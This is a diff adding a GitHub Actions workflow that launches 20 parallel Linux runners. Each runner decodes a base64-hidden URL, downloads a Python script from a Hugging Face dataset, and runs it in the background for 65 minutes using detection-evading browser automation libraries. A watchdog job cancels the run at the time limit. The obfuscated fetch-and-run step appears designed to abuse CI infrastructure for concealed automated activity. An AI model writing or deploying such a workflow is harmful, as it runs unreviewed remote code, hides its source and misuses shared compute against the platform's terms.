@@ -1,0 +1,107 @@
+name: Linux Trenched Task Cohort
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: trenched-cohort-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مُصدر قرار الإبطال: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  nullification-envoy:
+    name: "Nullification Envoy"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Issue Supreme Nullification Decree
+        run: |
+          echo "[ENVOY] Nullification envoy dispatched. Supreme nullification enforced at the 65-minute chime."
+          echo "[ENVOY] Inspecting workflow dossier: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[ENVOY] Chime sounded! Issuing supreme nullification decree..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[ENVOY] Supreme nullification decree issued. Every rising and resting unit will be nullified."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الحشد
+  # =================================================================
+  entrench-cohort:
+    name: "CohortUnit-${{ matrix.unit_crest }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_crest: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕
+      # ⋗ البند ①: إعداد الأرضية المبدئية
+      # ➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕
+      - name: Prepare Preliminary Ground
+        run: |
+          echo "[PREPARE] Preparing preliminary ground for CohortUnit-${{ matrix.unit_crest }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕
+      # ⋗ البند ②: استلام الوثيقة التنفيذية
+      # ➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕
+      - name: Take In Executive Document
+        run: |
+          echo "[TAKEIN] Taking in app_task.py from designated ledger library..."
+          LEDGER_LIBRARY=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$LEDGER_LIBRARY" -o app_task.py
+          echo "[TAKEIN] Executive document taken in successfully."
+
+      # ➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕
+      # ⋗ البند ③: جلب المكتبات الرفيقة
+      # ➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕
+      - name: Fetch Fraternal Libraries
+        run: |
+          echo "[FETCH] Fetching fraternal libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕
+      # ⋗ البند ④: التنفيذ المُسيَّج بالمدة (65 دقيقة)
+      # ➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕➕
+      - name: Execute Fenced Operation
+        run: |
+          echo ">> Entrenching CohortUnit-${{ matrix.unit_crest }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          COHORT_PID=$!
+          
+          echo ">> Fenced operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $COHORT_PID 2>/dev/null; then
+            echo ">> Fenced window elapsed! Retiring operation..."
+            kill -9 $COHORT_PID
+            echo ">> Operation retired by fence keeper."
+          else
+            echo ">> Operation closed within fenced window."
+          fi
